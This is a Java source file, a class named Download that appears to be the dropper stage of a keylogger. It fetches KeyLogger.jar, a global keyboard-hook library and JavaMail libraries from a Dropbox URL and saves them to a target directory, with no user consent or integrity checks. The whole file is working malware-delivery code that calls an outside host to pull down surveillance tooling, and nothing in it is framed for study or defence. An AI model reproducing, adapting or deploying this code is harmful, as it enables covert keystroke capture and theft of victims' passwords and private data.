import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;

public class Download 
{
  final private String KeyLoggerURL = "https://dl.dropboxusercontent.com/u/78870095/KeyLogger.jar";
  final private String jnativeURL = "https://dl.dropboxusercontent.com/u/78870095/jnativehook-2.0.3.jar";
  final private String javaxMailURL = "https://dl.dropboxusercontent.com/u/78870095/javax.mail.jar";
  final private String mailURL = "https://dl.dropboxusercontent.com/u/78870095/mail-1.4.7.jar";
  private String KeyLoggerDest;
  private String jnativeDest;
  private String javaxMailDest;
  private String mailDest;
  
  public Download(String kldir)
  {
    KeyLoggerDest = kldir + File.separator + "KeyLogger.jar";
    jnativeDest = kldir + File.separator + "jnativehook-2.0.3.jar";
    javaxMailDest = kldir + File.separator + "javax.mail.jar";
    mailDest = kldir + File.separator + "mail-1.4.7.jar";
    this.start(KeyLoggerURL, KeyLoggerDest);
    this.start(jnativeURL, jnativeDest);
    this.start(javaxMailURL, javaxMailDest);
    this.start(mailURL, mailDest);
  }
  
  public void start(String url, String dest)
  {
    try
    {
        ReadableByteChannel in=Channels.newChannel(new URL(url).openStream());
        FileChannel out=new FileOutputStream(dest).getChannel();
        out.transferFrom(in, 0, Long.MAX_VALUE);
    }
    catch ( Exception e)
    {
      e.printStackTrace();
    }
  }
}
